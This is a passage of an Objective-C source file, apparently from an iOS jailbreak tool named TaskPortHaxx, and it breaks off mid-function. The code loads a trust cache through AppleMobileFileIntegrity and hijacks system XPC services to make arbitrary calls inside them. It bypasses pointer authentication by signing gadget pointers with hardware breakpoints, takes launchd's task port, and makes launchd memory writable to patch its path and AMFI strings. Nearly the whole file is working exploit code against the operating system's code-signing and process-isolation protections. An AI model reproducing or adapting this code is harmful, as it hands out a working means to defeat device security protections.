//
//  TaskPortHaxx.m
//  TaskPortHaxxApp
//
//  Created by Duy Tran on 24/10/25.
//

@import Darwin;
@import MachO;
@import XPC;
#include <sys/wait.h>
#import <IOKit/IOKitLib.h>
#import "ProcessContext.h"
#import <UIKit/UIKit.h>
#import "Header.h"

#include <mach-o/dyld_images.h>
#include <roothide.h>
#include "unarchive.h"


#define NEW_AMFI_STRING "AAAA\x00"
#define NEW_LAUNCHD_PATH createLaunchdSymlink()

// #define NEW_AMFI_STRING "AMFI\x00"
// #define NEW_LAUNCHD_PATH "/sbin/launchd"


int load_trust_cache(NSString *tcPath) {
    NSData *tcData = [NSData dataWithContentsOfFile:tcPath];
    if (!tcData) {
        printf("Trust cache file not found: %s\n", tcPath.fileSystemRepresentation);
        abort();
    }
    CFDictionaryRef match = IOServiceMatching("AppleMobileFileIntegrity");
    io_service_t svc = IOServiceGetMatchingService(0, match);
    assert(MACH_PORT_VALID(svc));
    io_connect_t conn = MACH_PORT_NULL;
    assert(IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS);
    assert(MACH_PORT_VALID(conn));
    kern_return_t kr = IOConnectCallMethod(conn, 2, NULL, 0, tcData.bytes, tcData.length, NULL, NULL, NULL, NULL);
    if (kr != KERN_SUCCESS) {
        printf("IOConnectCallMethod failed: %s\n", mach_error_string(kr));
        abort();
    }
    printf("Loaded trust cache from %s\n", tcPath.fileSystemRepresentation);
    IOServiceClose(conn);
    IOObjectRelease(svc);
    return 0;
}

void clearXpcStagingFiles()
{
    for(NSString* item in [NSFileManager.defaultManager directoryContentsAtPath:@"/var/db/com.apple.xpc.roleaccountd.staging"]) {
        if([item isEqualToString:@"exec"] || [item hasPrefix:@"exec-"]) {
            [NSFileManager.defaultManager removeItemAtPath:[@"/var/db/com.apple.xpc.roleaccountd.staging" stringByAppendingPathComponent:item] error:nil];
        }
    }
}

const char* createLaunchdSymlink()
{
    static char buffer[255];

    uint32_t execPathSize = PATH_MAX;
    char executablePath[execPathSize];
	_NSGetExecutablePath(executablePath, &execPathSize);

    NSString *characterSet = @"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    NSUInteger stringLen = sizeof("/sbin/launchd")-sizeof("/tmp/.");
    NSMutableString *randomString = [NSMutableString stringWithCapacity:stringLen];
    for (NSUInteger i = 0; i < stringLen; i++) {
        NSUInteger randomIndex = arc4random_uniform((uint32_t)[characterSet length]);
        unichar randomCharacter = [characterSet characterAtIndex:randomIndex];
        [randomString appendFormat:@"%C", randomCharacter];
    }
    
    NSString* launchdSymlink = [@"/tmp/." stringByAppendingString:randomString];
    assert([NSFileManager.defaultManager createSymbolicLinkAtPath:launchdSymlink withDestinationPath:@(executablePath) error:nil]);
    strncpy(buffer, launchdSymlink.fileSystemRepresentation, sizeof(buffer));
    return buffer;
}

int child_stage1_prepare(NSString* execDir)
{    
    NSFileManager *fm = NSFileManager.defaultManager;
    NSString *outDir = jbroot(@TASKPORTHAXX_CACHE_DIR"/UpdateBrainService");
    [fm createDirectoryAtPath:outDir withIntermediateDirectories:YES attributes:nil error:nil];

    NSString *zipPath = [outDir stringByAppendingPathComponent:@"UpdateBrainService.zip"];
    NSString *assetDir = [outDir stringByAppendingPathComponent:@"AssetData"];
    
    if ([fm fileExistsAtPath:zipPath] || ![fm fileExistsAtPath:assetDir]) 
    {
        printf("Downloading UpdateBrainService\n");
        NSURL *url = [NSURL URLWithString:@"https://updates.cdn-apple.com/2022FallFCS/patches/012-73541/F0A2BDFD-317B-4557-BD18-269079BDB196/com_apple_MobileAsset_MobileSoftwareUpdate_UpdateBrain/f9886a753f7d0b2fc3378a28ab6975769f6b1c26.zip"];
        NSData *urlData = [NSData dataWithContentsOfURL:url];
        if (!urlData) {
            printf("Failed to download UpdateBrainService\n");
            return 1;
        }
        
        // Save and extract UpdateBrainService
        [urlData writeToFile:zipPath atomically:YES];
        printf("Downloaded UpdateBrainService to %s\n", zipPath.fileSystemRepresentation);
        printf("Extracting UpdateBrainService\n");
        assert(extract(zipPath, outDir, NULL) == 0);
        [NSFileManager.defaultManager removeItemAtPath:zipPath error:nil];
    }

    clearXpcStagingFiles();
    
    // Copy xpc service

    [fm createDirectoryAtPath:execDir withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *xpcName = @"com.apple.MobileSoftwareUpdate.UpdateBrainService.xpc";
    NSString *outXPCPath = [execDir stringByAppendingPathComponent:xpcName];
    if (![fm fileExistsAtPath:outXPCPath]) {
        NSError *error = nil;
        [fm copyItemAtPath:[assetDir stringByAppendingPathComponent:xpcName] toPath:outXPCPath error:&error];
        if (error) {
            NSLog(@"Failed to copy UpdateBrainService.xpc: %@", error);
            return 2;
        }
    }

    {
        [NSFileManager.defaultManager createDirectoryAtPath:execDir withIntermediateDirectories:YES attributes:nil error:nil];
        NSString *outDir = [execDir stringByAppendingPathComponent:@"com.apple.dt.instruments.dtsecurity.xpc"];
        if (![[NSFileManager defaultManager] fileExistsAtPath:outDir]) {
            NSError *error = nil;
            [NSFileManager.defaultManager copyItemAtPath:@"/System/Library/PrivateFrameworks/DVTInstrumentsFoundation.framework/XPCServices/com.apple.dt.instruments.dtsecurity.xpc" toPath:outDir error:&error];
            if (error) {
                NSLog(@"Failed to copy dtsecurity.xpc: %@", error);
                return 3;
            }
        }
    }
    
    printf("Stage 1 setup complete\n");
    return 0;
}

struct dyld_all_image_infos *_alt_dyld_get_all_image_infos(void) {
    static struct dyld_all_image_infos *result;
    if (result) {
        return result;
    }
    struct task_dyld_info dyld_info;
    mach_vm_address_t image_infos;
    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
    kern_return_t ret;
    ret = task_info(mach_task_self_,
                    TASK_DYLD_INFO,
                    (task_info_t)&dyld_info,
                    &count);
    if (ret != KERN_SUCCESS) {
        return NULL;
    }
    image_infos = dyld_info.all_image_info_addr;
    result = (struct dyld_all_image_infos *)image_infos;
    printf("[TaskPortHaxx] result = %p\n", result);
    printf("[TaskPortHaxx] infoArrayCount = %u\n", result->infoArrayCount);
    printf("[TaskPortHaxx] dyldAllImageInfosAddress = %p\n", result->dyldAllImageInfosAddress);
    printf("[TaskPortHaxx] sharedCacheBaseAddress = 0x%lx\n", result->sharedCacheBaseAddress);
    printf("[TaskPortHaxx] sharedCacheSlide = 0x%lx\n", result->sharedCacheSlide);
    for(int i=0; i<result->infoArrayCount; i++) {
        const struct dyld_image_info *info = &result->infoArray[i];
        const char *imageName = (const char *)info->imageFilePath;
        printf("[TaskPortHaxx] Image[%d]: %p %s\n", i, (void *)info->imageLoadAddress, imageName);
    }
    return result;
}
NSDictionary *getLaunchdStringOffsets(void) {
    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
    
    char *path = "/sbin/launchd";
    int fd = open(path, O_RDONLY);
    struct stat s;
    fstat(fd, &s);
    const struct mach_header_64 *map = mmap(NULL, s.st_size, PROT_READ, MAP_SHARED, fd, 0);
    assert(map != MAP_FAILED);
    
    size_t size = 0;
    char *cstring = (char *)getsectiondata(map, SEG_TEXT, "__cstring", &size);
    assert(cstring);
    while (size > 0) {
        dict[@(cstring)] = @(cstring - (char *)map);
        uint64_t off = strlen(cstring) + 1;
        cstring += off;
        size -= off;
    }
    
    munmap((void *)map, s.st_size);
    close(fd);
    return dict;
}

uint64_t getDyldPACIAOffset(uint64_t _dyld_start) {
    void *handle = dlopen("/usr/lib/dyld", RTLD_GLOBAL);
    uint32_t *func = (uint32_t *)dlsym(RTLD_DEFAULT, "_dyld_start");
    uint32_t *dyld_start_func = func;

    // 1. find where `B start`
    for (; (*func & 0xFC000000) != 0x14000000;/* b */ func++) {}
    // printf("B start: %p\n", func);

    // 2. obtain offset where branch
    uint32_t imm26 = *func & 0x3ffffff;
    int32_t off = (int32_t)(imm26 << 2);
    if (imm26 & (1<<25)) off |= 0xFC000000;
    // printf("off: %d\n", off);
    func += off/sizeof(*func);
    // printf("start: %p\n", func);

    // 3. find pacia x16, x8
    for (; (*func & 0xFFFFFFFF) != 0xDAC10110;/* pacia x16, x8 */ func++) {}
    // printf("pacia x16, x8 in start: %p\n", func);
    off = (uint32_t)(uint64_t)dyld_start_func - (uint32_t)(uint64_t)func;

    uint64_t pacia_inst = _dyld_start - off;
    return pacia_inst;
}

@interface TaskPortHaxx : NSObject
@end

@interface TaskPortHaxx ()
@property(nonatomic) mach_port_t fakeBootstrapPort;
@property(nonatomic) ProcessContext *dtProc;
@property(nonatomic) ProcessContext *ubProc;
@end

@implementation TaskPortHaxx

- (void)prepare {
    // find launchd string offsets
    NSUserDefaults *defaults = NSUserDefaults.standardUserDefaults;
    if (!defaults.offsetLaunchdPath) {
        NSDictionary *offsets = getLaunchdStringOffsets();
        defaults.offsetLaunchdPath = [offsets[@"/sbin/launchd"] unsignedLongValue];
        // AMFI is only needed for iOS 17.0 to bypass launch constraint
        defaults.offsetAMFI = [offsets[@"AMFI"] unsignedLongValue];
        printf("Found launchd path string offset: 0x%lx\n", defaults.offsetLaunchdPath);
        if (defaults.offsetAMFI) {
            printf("Found AMFI string offset: 0x%lx\n", defaults.offsetAMFI);
        }
    }
    
    self.fakeBootstrapPort = setup_fake_bootstrap_server();
    
    self.dtProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.dtsecurity_exception_server"];
    self.ubProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.updatebrain_exception_server"];
    
if(IS_ARM64E_DEVICE()) {

    // TODO: save offsets
    // unauthenticated br x8 gadget
    void *handle = dlopen("/usr/lib/swift/libswiftDistributed.dylib", RTLD_GLOBAL);
    assert(handle != NULL);
    uint32_t *func = (uint32_t *)dlsym(RTLD_DEFAULT, "swift_distributed_execute_target");
    assert(func != NULL);
    for (; *func != 0xd61f0100; func++) {}
    brX8Address = (uint64_t)func;
    printf("Found br x8 at address: 0x%016lx\n", brX8Address);
    // if br x8 != saved address, clear saved address
    uint64_t savedPpointer = NSUserDefaults.standardUserDefaults.signedPointer;
    if (savedPpointer != 0 && (brX8Address&0xFFFFFFFFF) != (savedPpointer&0xFFFFFFFFF)) {
        printf("br x8 address changed, clearing saved signed pointer\n");
        NSUserDefaults.standardUserDefaults.signedPointer = 0;
        NSUserDefaults.standardUserDefaults.signedDiversifier = 0;
    }

    // PAC signing gadget
    func = (uint32_t *)zeroify_scalable_zone;
    for (; func[0] != 0xdac10230 || func[1] != 0xf9000110; func++) {}
    paciaAddress = (uint64_t)func;
    printf("Found pacia x16, x17 at address: 0x%016lx\n", paciaAddress);
    
    // change LR gadget
    func = (uint32_t *)dispatch_debug;
    for (; func[0] != 0xaa0103fe || func[1] != 0xf9402008; func++) {}
    changeLRAddress = (uint64_t)func;

}

    _alt_dyld_get_all_image_infos();

}




- (void)performBypassPAC {
    int ret;
    kern_return_t kr;
    vm_size_t page_size = getpagesize();
    
    // attach to dtsecurity
    ret = (int)RemoteArbCall(self.ubProc, ptrace, PT_ATTACHEXC, self.dtProc.pid, 0, 0);
    printf("ptrace(PT_ATTACHEXC) returned %d\n", ret);
    assert(ret == 0);
    //PT_ATTACHEXC on a suspended process will resume it if its exception port is not set.
    // kr = (int)RemoteArbCall(self.ubProc, ptrace, PT_CONTINUE, self.dtProc.pid, 1, 0);
    // printf("ptrace(PT_CONTINUE) returned %d\n", ret);
    // assert(ret == 0);
    
    while (!self.dtProc.catched) {
#warning TODO: maybe another semaphore
        usleep(200000);
    }
    dtsecurityTaskPort = self.dtProc.taskPort;
    //bootstrap_register(bootstrap_port, "com.kdt.taskporthaxx.dtsecurity_task_port", dtsecurityTaskPort);
    if(!dtsecurityTaskPort) {
        printf("dtsecurity task port is null?\n");
        abort();
    }
    
    // create a region which holds temp data
    vm_address_t map = RemoteArbCall(self.ubProc, mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (!map) {
        printf("Failed to call mmap\n");
        abort();
    }
    
    // Pass dtsecurity task port to UpdateBrainService
    kr = RemoteArbCall(self.ubProc, task_get_special_port, 0x203, TASK_BOOTSTRAP_PORT, map);
    assert(kr == KERN_SUCCESS);

    mach_port_t remote_bootstrap_port = [self.ubProc read32:map];
    printf("remote_bootstrap_port : 0x%x\n", remote_bootstrap_port);
    assert(MACH_PORT_VALID(remote_bootstrap_port));

    vm_address_t xpc_bootstrap_pipe = RemoteArbCall(self.ubProc, xpc_pipe_create_from_port, remote_bootstrap_port, 0, map);
    printf("xpc_bootstrap_pipe: 0x%lx\n", xpc_bootstrap_pipe);
    assert(xpc_bootstrap_pipe != 0);

    vm_address_t dict = RemoteArbCall(self.ubProc, xpc_dictionary_create_empty);
    printf("dict: 0x%lx\n", dict);
    assert(dict != 0);

    vm_address_t keyStr = [self.ubProc writeString:map+0x10 string:"name"];
    vm_address_t valueStr = [self.ubProc writeString:map+0x20 string:"port"];
    RemoteArbCall(self.ubProc, xpc_dictionary_set_string, dict, keyStr, valueStr);
    ret = RemoteArbCall(self.ubProc, _xpc_pipe_interface_routine, xpc_bootstrap_pipe, 0xcf, dict, map, 0);
    printf("_xpc_pipe_interface_routine returned: %d\n", ret);
    assert(ret == 0);
    
    vm_address_t reply = [self.ubProc read64:map];
    mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(self.ubProc, xpc_dictionary_copy_mach_send, reply, valueStr);
    if (!MACH_PORT_VALID(dtsecurity_task)) {
        printf("Failed to get dtsecurity task port from UpdateBrainService\n");
        abort();
    }
    printf("Got dtsecurity task port from UpdateBrainService: 0x%x\n", dtsecurity_task);
    
    // Get dtsecurity thread port
    vm_address_t threads = map + 0x10;
    vm_address_t thread_count = map;
    [self.ubProc write32:thread_count value:TASK_BASIC_INFO_64_COUNT];
    kr = (kern_return_t)RemoteArbCall(self.ubProc, task_threads, dtsecurity_task, threads, thread_count);
    if (kr != KERN_SUCCESS) {
        printf("task_threads failed: %s\n", mach_error_string(kr));
        abort();
    }
    threads = [self.ubProc read64:threads];
    printf("dtsecurity threads array: 0x%lx\n", threads);
    assert(threads != 0);
    thread_t dtsecurity_thread = (thread_t)[self.ubProc read32:threads];
    printf("dtsecurity thread port: 0x%x\n", dtsecurity_thread);
    assert(MACH_PORT_VALID(dtsecurity_thread));
    
    // Get dtsecurity debug state
    arm_debug_state64_t *debug_state = (arm_debug_state64_t *)(map + 0x10);
    vm_address_t debug_state_count = map;
    [self.ubProc write32:debug_state_count value:ARM_DEBUG_STATE64_COUNT];
    kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_get_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, debug_state_count);
    if (kr != KERN_SUCCESS) {
        printf("thread_get_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
        abort();
    }
    
    // Find pacia instruction in dyld`start
    uint64_t _dyld_start = xpaci(self.dtProc.newState->__pc);
    uint64_t pacia_inst = getDyldPACIAOffset(_dyld_start);
    printf("_dyld_start: 0x%llx\n", _dyld_start);
    printf("pacia: 0x%llx\n", pacia_inst);
    assert(pacia_inst != 0);
    
    // Set hardware breakpoint 1 to pacia instruction
    [self.ubProc write64:(uint64_t)&debug_state->__bvr[0] value:pacia_inst];
    [self.ubProc write64:(uint64_t)&debug_state->__bcr[0] value:0x1e5];
    kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_set_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, ARM_DEBUG_STATE64_COUNT);
    if (kr != KERN_SUCCESS) {
        printf("thread_set_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
        abort();
    }
    
    printf("Bypassing PAC right now\n");
    
    int status = proc_get_status(self.dtProc.pid);
    printf("procInfo.pbi_status: %d\n", status);
    assert(status == SSTOP);

    // Clear SIGTRAP
    ret = (int)RemoteArbCall(self.ubProc, ptrace, PT_THUPDATE, self.dtProc.pid, dtsecurity_thread, 0);
    if(ret != 0) {
        int err = [self.ubProc read32:(uint64_t)&errno];
        printf("ptrace(PT_THUPDATE) failed: %d,%d,%s\n", ret, err, strerror(err));
        abort();
    }

    ret = RemoteArbCall(self.ubProc, kill, self.dtProc.pid, SIGCONT);
    assert(ret == 0);

    self.dtProc.expectedLR = 0;
    [self.dtProc resume];
    printf("Resume1: PC: 0x%llx\n", self.dtProc.newState->__pc); //SIGCONT on _dyld_start
    
    // This shall step to pacia instruction
    self.dtProc.expectedLR = (uint64_t)-1;
    [self.dtProc resume];
    printf("Resume2: PC: 0x%llx\n", self.dtProc.newState->__pc); //pacia x16, x8 on dyld`main
    
    uint64_t currPC = xpaci(self.dtProc.newState->__pc);
    if (currPC != pacia_inst) {
        printf("Did not hit pacia breakpoint?\n");
        abort();
    }
    self.dtProc.expectedLR = (uint64_t)self.dtProc.newState->__lr;
    printf("We hit PACIA breakpoint!\n");
    // Move our hardware breakpoint to the next instruction after pacia
    // TODO: maybe single step instead?
    [self.ubProc write64:(uint64_t)&debug_state->__bvr[0] value:pacia_inst+4];
    [self.ubProc write64:(uint64_t)&debug_state->__bcr[0] value:0x1e5];
    kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_set_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, ARM_DEBUG_STATE64_COUNT);
    if (kr != KERN_SUCCESS) {
        printf("thread_set_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
        abort();
    }
    // Save x16 and x8 for later restore
    uint64_t origX16 = self.dtProc.newState->__x[16];
    uint64_t origX8 = self.dtProc.newState->__x[8];
    self.dtProc.newState->__x[8] = 0x74810000AA000000; // 'pc' discriminator, 0xAA diversifier
    
    // MARK: Sign pacia pointer
    self.dtProc.newState->__x[16] = xpaci(self.dtProc.newState->__pc);
    [self.dtProc resume];
    printf("Resume3: PC: 0x%llx\n", self.dtProc.newState->__pc); //(pacia x16, x8)+4 on dyld`main
    uint64_t signedPaciaPtr = self.dtProc.newState->__x[16];
    printf("Signed pacia gadget: 0x%llx\n", signedPaciaPtr);
    
    // MARK: Sign br x8 pointer
    // Step back to pacia instruction to sign br x8
    self.dtProc.newState->__x[16] = brX8Address;
    self.dtProc.newState->__pc = signedPaciaPtr;
    self.dtProc.newState->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
    [self.dtProc resume];
    printf("Resume4: PC: 0x%llx\n", self.dtProc.newState->__pc); //(pacia x16, x8)+4 on dyld`main
    brX8Address = self.dtProc.newState->__x[16];
    printf("Signed brX8Address: 0x%lx\n", brX8Address);
    
    // Clear hardware breakpoint
    [self.ubProc write64:(uint64_t)&debug_state->__bvr[0] value:0];
    [self.ubProc write64:(uint64_t)&debug_state->__bcr[0] value:0];
    kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_set_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, ARM_DEBUG_STATE64_COUNT);
    if (kr != KERN_SUCCESS) {
        printf("thread_set_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
        abort();
    }
    
    // Restore original values
    self.dtProc.newState->__x[16] = origX16;
    self.dtProc.newState->__x[8] = origX8;
    self.dtProc.newState->__pc = signedPaciaPtr;
    self.dtProc.newState->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
    self.dtProc.expectedLR = (uint64_t)-1;
    [self.dtProc resume];
    printf("Resume5: PC: 0x%llx/0x%llx\n", self.dtProc.newState->__pc, xpaci(self.dtProc.newState->__pc)); //xpc breakpoint



    /*
        [self.ubProc write32:(uint64_t)map value:TASK_DYLD_INFO_COUNT];
        kr = (kern_return_t)RemoteArbCall(self.ubProc, task_info, dtsecurity_task, TASK_DYLD_INFO, map + 8, map);
        if (kr != KERN_SUCCESS) {
            printf("task_info failed\n");
            abort();
        }
        printf("[dtsecurity] TASK_DYLD_INFO_COUNT = %u\n", [self.ubProc read32:map]);

        struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = (void *)[self.ubProc read64:(map + 8 + offsetof(struct task_dyld_info, all_image_info_addr))];
        printf("[dtsecurity] dyld_all_image_infos_addr: %p\n", remote_dyld_all_image_infos_addr);
        
        kr = (kern_return_t)RemoteArbCall(self.ubProc, vm_read_overwrite, dtsecurity_task, (mach_vm_address_t)remote_dyld_all_image_infos_addr, sizeof(struct dyld_all_image_infos), map+0x100, map);
        if (kr != KERN_SUCCESS) {
            printf("vm_read_overwrite _dyld_all_image_infos->infoArray failed\n");
            abort();
        }

        uint32_t infoArrayCount = [self.ubProc read32:map+0x100+offsetof(struct dyld_all_image_infos, infoArrayCount)];
        vm_address_t infoArray = [self.ubProc read64:map+0x100+offsetof(struct dyld_all_image_infos, infoArray)];

        printf("[dtsecurity] infoArrayCount = %u, infoArray = 0x%lx\n", infoArrayCount, infoArray);
        printf("[dtsecurity] dyldAllImageInfosAddress = 0x%llx\n", [self.ubProc read64:map+0x100+offsetof(struct dyld_all_image_infos, dyldAllImageInfosAddress)]);
        printf("[dtsecurity] sharedCacheBaseAddress = 0x%llx\n", [self.ubProc read64:map+0x100+offsetof(struct dyld_all_image_infos, sharedCacheBaseAddress)]);
        printf("[dtsecurity] sharedCacheSlide = 0x%llx\n", [self.ubProc read64:map+0x100+offsetof(struct dyld_all_image_infos, sharedCacheSlide)]);
        
        for (int i = 0; i < infoArrayCount; i++) {
            kr = (kern_return_t)RemoteArbCall(self.ubProc, vm_read_overwrite, dtsecurity_task, infoArray + i * sizeof(struct dyld_image_info), sizeof(struct dyld_image_info), map+0x10, map);
            uint64_t base = [self.ubProc read64:map+0x10+0];
            uint64_t file = [self.ubProc read64:map+0x10+8];
            RemoteArbCall(self.ubProc, vm_read_overwrite, dtsecurity_task, file, 256, map+0x110, map+0x100);
            char path[257];
            for(int j=0;j<256/8;j++) {
                *(uint64_t*)(path + j*8) = [self.ubProc read64:map+0x110 + j*8];
            }
            path[256] = 0;
            printf("[dtsecurity] Image[%d] = 0x%llx %s\n", i, base, path);
        }
    //*/


    //verify br x8
    kr = RemoteArbCall(self.ubProc, vm_read_overwrite, dtsecurity_task, (vm_address_t)xpaci(brX8Address), 4, map+0, map+4);
    if (kr != KERN_SUCCESS) {
        printf("vm_read_overwrite failed: %s\n", mach_error_string(kr));
        abort();
    }
    uint32_t code = [self.ubProc read32:map + 0];
    uint32_t size = [self.ubProc read32:map + 4];
    printf("[dtsecurity] br x8 instruction: 0x%08x size=%x\n", code, size);
    assert(size==4 && code==0xd61f0100); // br x8

}



#define RemoteRead32(addr) [self.dtProc read32:addr]
#define RemoteRead64(addr) [self.dtProc read64:addr]
#define RemoteWrite32(addr, value_) [self.dtProc write32:addr value:value_]
#define RemoteWrite64(addr, value_) [self.dtProc write64:addr value:value_]
- (void)exploit:(NSString*)execDir
{
    // dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{

        if(!execDir) {
            execDir = [@"/var/db/com.apple.xpc.roleaccountd.staging/exec-" stringByAppendingString:[[NSUUID UUID] UUIDString]];
            assert(child_stage1_prepare(execDir) == 0);
            
            NSString *tcPath = jbroot(@TASKPORTHAXX_CACHE_DIR"/UpdateBrainService/AssetData/.TrustCache");
            assert(load_trust_cache(tcPath) == 0);
        }

        // preflight UpdateBrainService
        [self.ubProc spawnProcess:[execDir stringByAppendingPathComponent:@"com.apple.MobileSoftwareUpdate.UpdateBrainService.xpc/com.apple.MobileSoftwareUpdate.UpdateBrainService"] suspended:NO];
        printf("Spawned UpdateBrainService with PID %d\n", self.ubProc.pid);
        if(self.ubProc.pid <= 0) {
            printf("Failed to launch UpdateBrainService\n");
            abort();
        }

        printf("Waiting for UpdateBrainService to be ready...\n");
        while (!self.ubProc.catched) {
            usleep(200000);
        }

        //verify arb call
        pid_t UpdateBrainServicePID = RemoteArbCall(self.ubProc, getpid);
        printf("UpdateBrainService PID: %d\n", UpdateBrainServicePID);
        assert(UpdateBrainServicePID == self.ubProc.pid);

        [self.dtProc spawnProcess:[execDir stringByAppendingPathComponent:@"com.apple.dt.instruments.dtsecurity.xpc/com.apple.dt.instruments.dtsecurity"] suspended:IS_ARM64E_DEVICE()];
        printf("Spawned dtsecurity with PID %d\n", self.dtProc.pid);
        if(self.dtProc.pid <= 0) {
            printf("Failed to launch dtsecurity\n");
            abort();
        }
        
        if (*(uint32_t *)getpagesize == 0xd503237f) {
            // we know this is arm64e hardware if some function starts with pacibsp
            printf("Performing PAC bypass...\n");
            [self performBypassPAC];
            printf("PAC bypass complete\n");
        } else {
            printf("Waiting for dtsecurity to be ready...\n");
            while (!self.dtProc.catched) {
                #warning TODO: maybe another semaphore
                usleep(200000);
            }
        }

        //verify arb call
        pid_t dtsecurityPID = RemoteArbCall(self.dtProc, getpid);
        printf("dtsecurity PID: %d\n", dtsecurityPID);
        assert(dtsecurityPID == self.dtProc.pid);

        kern_return_t kr;
        vm_size_t page_size = getpagesize();
        
        // Create a region which holds temp data (should we use stack instead?)
        vm_address_t map = RemoteArbCall(self.dtProc, mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
        if (!map) {
            printf("Failed to call mmap. Please try resetting pointer and try again\n");
            abort();
        }
        printf("Mapped memory at 0x%lx\n", map);
        
        // Test mkdir
//        RemoteWriteString(map, "/tmp/.it_works");
//        RemoteArbCall(self.dtProc, mkdir, map, 0700);
        
        // Get my task port
        mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(self.dtProc, task_self_trap);
//        kr = (kern_return_t)RemoteArbCall(self.dtProc, task_for_pid, dtsecurity_task, getpid(), map);
//        if (kr != KERN_SUCCESS) {
//            printf("Failed to get my task port\n");
//            abort();
//        }
//        mach_port_t my_task = (mach_port_t)RemoteRead32(map);
//        // Map the page we allocated in dtsecurity to this process
//        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_remap, my_task, map, page_size, 0, VM_FLAGS_ANYWHERE, dtsecurity_task, map, false, map+8, map+12, VM_INHERIT_SHARE);
//        if (kr != KERN_SUCCESS) {
//            printf("Failed to create dtsecurity<->haxx shared mapping\n");
//            abort();
//        }
//        vm_address_t local_map = RemoteRead64(map);
//        printf("Created shared mapping: 0x%lx\n", local_map);
//        printf("read: 0x%llx\n", *(uint64_t *)local_map);
        
        // Get launchd task port
        kr = (kern_return_t)RemoteArbCall(self.dtProc, task_for_pid, dtsecurity_task, 1, map);
        if (kr != KERN_SUCCESS) {
            printf("Failed to get launchd task port\n");
            abort();
        }
        
        mach_port_t launchd_task = (mach_port_t)RemoteRead32(map);
        printf("Got launchd task port: %d\n", launchd_task);
        
        // Get remote dyld base
        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
        kr = (kern_return_t)RemoteArbCall(self.dtProc, task_info, launchd_task, TASK_DYLD_INFO, map + 8, map);
        if (kr != KERN_SUCCESS) {
            printf("task_info failed\n");
            abort();
        }
        struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8 + offsetof(struct task_dyld_info, all_image_info_addr)));
        printf("launchd dyld_all_image_infos_addr: %p\n", remote_dyld_all_image_infos_addr);
        
        // uint32_t infoArrayCount = &remote_dyld_all_image_infos_addr->infoArrayCount;
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArrayCount, sizeof(uint32_t), map, map + 8);
        if (kr != KERN_SUCCESS) {
            printf("vm_read_overwrite _dyld_all_image_infos->infoArrayCount failed\n");
            abort();
        }
        uint32_t infoArrayCount = RemoteRead32(map);
        printf("launchd infoArrayCount: %u\n", infoArrayCount);
        
        //const struct dyld_image_info* infoArray = &remote_dyld_all_image_infos_addr->infoArray;
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArray, sizeof(uint64_t), map, map + 8);
        if (kr != KERN_SUCCESS) {
            printf("vm_read_overwrite _dyld_all_image_infos->infoArray failed\n");
            abort();
        }
        
        // Enumerate images to find launchd base
        vm_address_t launchd_base = 0;
        vm_address_t infoArray = RemoteRead64(map);
        for (int i = 0; i < infoArrayCount; i++) {
            kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, infoArray + sizeof(uint64_t[i*3]), sizeof(uint64_t), map, map + 8);
            uint64_t base = RemoteRead64(map);
            if (base % page_size) {
                // skip unaligned entries, as they are likely in dsc
                continue;
            }
            printf("Image[%d] = 0x%llx\n", i, base);
            // read magic, cputype, cpusubtype, filetype
            kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, base, 16, map, map + 16);
            uint64_t magic = RemoteRead32(map);
            if (magic != MH_MAGIC_64) {
                printf("not a mach-o (magic: 0x%x)\n", (uint32_t)magic);
                continue;
            }
            uint32_t filetype = RemoteRead32(map + 12);
            if (filetype == MH_EXECUTE) {
                printf("found launchd executable at 0x%llx\n", base);
                launchd_base = base;
                break;
            }
        }
        
        // Reprotect rw
        // minimum page = 0x5f000;
        vm_offset_t launchd_str_off = NSUserDefaults.standardUserDefaults.offsetLaunchdPath;
        vm_offset_t amfi_str_off = NSUserDefaults.standardUserDefaults.offsetAMFI;

        assert(launchd_str_off != 0);
        
        printf("reprotecting 0x%lx\n", (launchd_base + launchd_str_off & ~PAGE_MASK));
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_protect, launchd_task, launchd_base + launchd_str_off & ~PAGE_MASK, 0x8000, false, VM_PROT_READ|VM_PROT_WRITE);
        if(kr == KERN_PROTECTION_FAILURE) 
        {
